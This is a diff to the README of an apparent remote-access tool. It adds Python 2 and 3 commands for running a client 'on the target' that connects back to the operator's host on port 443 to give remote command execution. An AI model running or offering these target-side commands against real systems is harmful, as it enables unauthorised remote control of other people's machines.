@@ -25,10 +25,16 @@ sudo python3 server.py -p 443
 On the target:
 
 ```bash
-python3 client_3.py -p 443 -t <your_ip_or_hostname>
+python3 client.py -p 443 -t <your_ip_or_hostname>
+```
+or 
+```bash
+python client.py -p 443 -t <your_ip_or_hostname>
 ```
 
 Use the parameter `--help` on either to see all possible parameters.
+
+The server requires python3. The client works with both Python 2.7 and Python 3.
 
 ## Requirements
 
@@ -39,7 +45,7 @@ None
 * Monitor status of client
 * Handle multiple clients
 * Proper client session instead of just RCE
-* Python2 version of client
+* Python2 version of client [done]
 * C version of client
 * Actually take Content-Length into account for big responses [done]
 * Auto-create key/cert
